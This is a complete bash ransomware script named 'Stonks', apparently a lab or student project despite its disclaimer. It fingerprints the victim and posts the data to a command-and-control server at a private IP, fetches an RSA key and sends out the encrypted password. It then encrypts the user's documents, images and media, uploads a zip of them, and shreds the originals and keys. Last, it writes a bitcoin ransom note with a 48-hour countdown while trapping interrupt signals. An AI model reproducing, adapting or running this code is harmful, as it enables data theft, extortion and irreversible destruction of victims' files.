#!/bin/bash

# ------------------------------------------------------------------------
#
# Stonks
#
# This is a new ransomware adapted from a beautifuled version of Anubis
# 7213e5c01d88289fce3b3ba60a5dcb832caba521767a68f1832dc650ddb24a77
# DISCLAIMER:
# DO NOT EXECUTE this program on your personal computer or in
# any other machine if you do not understand what it does and what the
# risks are.
#
# ------------------------------------------------------------------------



# Identifies the victim then send the infos on a distant API
function get_info(){
	info=$(whoami && uname -a && id) 
 	b64=$(echo -n "$info" | base64)
	 # generate a guid for the victim
	guid=$(openssl rand -hex 12)
 	echo "$guid...$b64" > info.txt
	curl -X POST -H "Filename: info.txt" --data-binary @info.txt http://192.168.106.158:9002/
}


#encrypt the files then regroup it in an exfil to be sent
function encrypt(){
	# using find command to read all the files recursively and encrypt them
	# make a directory to store sensitive files for exfiltration
	mkdir /home/"$USER"/Desktop/Exfil
	chmod 777 /home/"$USER"/Desktop/Exfil
	# Chose the files with the searched extensions
	find "$1" -type f \( -name "*.docx" -o -name "*.pdf" -o -name "*.txt" -o \
    -name "*.jpg" -o -name "*.png" -o -name "*.mp4" -o -name "*.mp3" \) | while IFS= read -r filename; do
    openssl enc -p -aes-256-cbc -salt -pbkdf2 -in "$filename" -out "$filename".stonks -pass file:./password
    cp "$filename".stonks /home/"$USER"/Desktop/Exfil
    shred -f -u -z "$filename"
	done
	echo -e "------------------\n------ System encrypted ------\n------------------"S
	# make a zip archive
	zip -r Exfil.zip /home/"$USER"/Desktop/Exfil
	
	echo -e "------------------\n------ Files ready for exfiltration ------\n------------------"
	curl -X POST -H "Filename: Exfil.zip" --data-binary @Exfil.zip http://192.168.106.158:9002/

	# again delete the whole directory and leave the zip file
	find /home/"$USER"/Desktop/Exfil -depth -type f -exec shred -v -n 1 -z -u {} \;
	rmdir /home/"$USER"/Desktop/Exfil
	# delete the password used for encryption that was sent to the C2 server
	shred -f -u -z password
	shred -f -u -z pub.pem
	shred -f -u -z password.b64.enc
	shred -f -u -z password.enc
}


#
# get the public key from the distant server
function stonks(){
	# first we need to get the public key
	curl --silent http://192.168.106.158:9002/public-key.pem -o pub.pem
	# generate a password for encryption and then encrypt the password using the public key
	openssl rand -hex 44 | cat > password && openssl pkeyutl -encrypt -inkey pub.pem -pubin -in password -out password.enc
	base64 password.enc > password.b64.enc
	# exfiltrate the encrypted password
	curl -X POST -H "Filename: password.b64.enc" --data-binary @/home/srs/bash-malware/password.b64.enc http://192.168.106.158:9002/
	folder=/home/"$USER" # set this to ~ for full system encryption ( be root )
	encrypt "$folder"
}

#Generates the ransom on the desktop
function ransom_txt(){
	# place the ransom note on the users Desktop
	cd /home/"$USER"/Desktop
	touch ransom.txt
	echo -e "You were hacked, please send 1$ in bitcoin to this crypto wallet : https://tinyurl.com/RansomShortName
	We have all your informations and your files, don't play with us. You have 48 hours to send the money.
	" > ransom.txt
	countdown=172800
	while [ $countdown -gt 0 ]; do
	    echo -ne "Compte à rebours : $countdown\033[0K\r"
	    ((countdown--))
	    sleep 1
	done
	echo -e "\nDites au revoir à vos données"

}

trap '' SIGINT SIGTERM SIGQUIT SIGHUP SIGKILL
get_info
stonks
ransom_txt
trap - SIGINT SIGTERM SIGQUIT SIGHUP SIGKILL
